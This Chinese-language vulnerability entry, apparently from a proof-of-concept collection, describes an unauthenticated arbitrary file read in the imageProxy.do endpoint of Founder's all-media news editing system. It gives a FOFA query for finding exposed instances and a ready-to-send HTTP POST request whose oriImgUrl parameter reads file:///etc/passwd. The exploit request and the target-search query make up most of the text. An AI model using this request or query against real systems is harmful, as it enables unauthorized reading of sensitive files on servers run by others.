# 方正畅享全媒体新闻采编系统imageProxy.do任意文件读取漏洞

方正畅享全媒体新闻采编系统 imageProxy.do 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。

## fofa

```javascript
app="FOUNDER-全媒体采编系统"
```

## poc

```javascript
POST /newsedit/outerfotobase/imageProxy.do HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: text/plain, */*; q=0.01

oriImgUrl=file:///etc/passwd
```

![image-20250103100410296](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501031004386.png)